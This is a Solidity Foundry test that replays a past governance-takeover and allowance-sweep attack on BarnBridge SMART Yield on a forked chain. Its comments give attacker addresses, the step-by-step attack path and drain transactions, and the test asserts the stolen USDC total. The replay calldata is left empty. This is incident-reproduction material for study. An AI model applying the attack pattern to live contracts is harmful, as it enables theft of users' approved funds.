pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~$776K USDC (774,943.379409 + 1,632.168524)
// Attacker  : 0xF908610E9174c7cd6e9dfD371e238be4511297A1
// Controller proxy (attacker-deployed, DAO-set): 0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580
// Malicious impl : 0x769a9fa1e2414db14b35c46e4095d6e8f1694565
// CompoundProvider (BarnBridge SMART Yield cUSDC — NOT Compound Protocol core):
//               0xdaa037f99d168b552c0c61b7fb64cf7819d78310
// SmartYield   : 0x4B8d90D68F26DEF303Dcb6CFc9b63A1aAEC15840
// Old controller: 0x41Ab25709e0C3EDf027F6099963fE9AD3EBaB3A3
// DAO Governor : 0x4cae362d7f227e3d306f70ce4878e245563f3069
// Drain1 : https://etherscan.io/tx/0xd191fead1b9a2244f2837560f35d4fc865404914d229bfcb0172d1a7a9895afb
// Drain2 : https://etherscan.io/tx/0x7d722637a58a7117dbca0182ec26d74e2be0c1052ac319f0150bc056e528d238
//
// @Info
// Vulnerable path : CompoundProvider._takeUnderlying (onlySmartYieldOrController)
//                   + transferFees() → feesOwner
//
// @Analysis
// BarnBridge SMART Yield (cUSDC) governance → controller swap → malicious upgrade
// → allowance sweep. NOT a Compound Protocol core exploit.
//
// 1. Attacker deploys Transparent-style controller proxy 0x66c6… with initial
//    implementation = legitimate controller 0x41ab… and admin = attacker
//    (block 25472222).
// 2. Attacker proposes/queues BarnBridge DAO proposal to
//    CompoundProvider.setController(0x66c6…) (onlyControllerOrDao).
// 3. After timelock, setController lands (block 25535097). Provider now trusts
//    attacker-admin proxy as controller.
// 4. Attacker deploys malicious impl 0x769a… and upgradeTo (block 25535107).
// 5. Malicious drain(provider, users[], amounts[]) loops
//    provider._takeUnderlying(user, amt) using standing USDC approvals, then
//    provider.transferFees() which forwards balance to controller.feesOwner()
//    (attacker). Two batches: ~50 + ~42 victims.
//
// PoC scope: post-upgrade fork (block 25535119), replay both historical drain
// calldatas for exact on-chain USDC profit.

address constant ATTACKER = 0xF908610E9174c7cd6e9dfD371e238be4511297A1;
address constant CONTROLLER = 0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580;
address constant PROVIDER = 0xDAA037F99d168b552c0c61B7Fb64cF7819D78310;
address constant SMART_YIELD = 0x4B8d90D68F26DEF303Dcb6CFc9b63A1aAEC15840;
address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

// First drain is in block 25535120; fork one before (post upgradeTo at 25535107).
uint256 constant FORK_BLOCK = 25_535_119;
// 774_943.379409 + 1_632.168524 USDC (6 decimals)
uint256 constant EXPECTED_PROFIT = 776_575_547_933;

contract BarnBridgeSmartYield_exp is BaseTestWithBalanceLog {
    function setUp() public {
        // Online warm: exhaustive_warm rewrites localhost <-> mainnet alias.
        vm.createSelectFork("http://127.0.0.1:8545", FORK_BLOCK);
        fundingToken = USDC;
        attacker = ATTACKER;
    }

    function testExploit() public balanceLog {
        vm.label(ATTACKER, "Attacker");
        vm.label(CONTROLLER, "ControllerProxy");
        vm.label(PROVIDER, "CompoundProvider");
        vm.label(SMART_YIELD, "SmartYield_bb_cUSDC");
        vm.label(USDC, "USDC");

        uint256 beforeBal = IERC20(USDC).balanceOf(ATTACKER);

        // Historical drain calldatas (selector 0xe321fa05) — batch _takeUnderlying
        // + transferFees via the malicious controller implementation.
        bytes memory drain1 = hex"";
        bytes memory drain2 = hex"";

        vm.startPrank(ATTACKER, ATTACKER);
        (bool ok1, bytes memory ret1) = CONTROLLER.call(drain1);
        require(ok1, string(ret1));
        (bool ok2, bytes memory ret2) = CONTROLLER.call(drain2);
        require(ok2, string(ret2));
        vm.stopPrank();

        uint256 profit = IERC20(USDC).balanceOf(ATTACKER) - beforeBal;
        assertEq(profit, EXPECTED_PROFIT, "attacker USDC profit mismatch");

        emit log_named_decimal_uint("Attacker USDC profit", profit, 6);
        emit log_named_uint("Drain batches replayed", 2);
        emit log_named_decimal_uint("Batch1 USDC", 774_943_379_409, 6);
        emit log_named_decimal_uint("Batch2 USDC", 1_632_168_524, 6);
    }
}
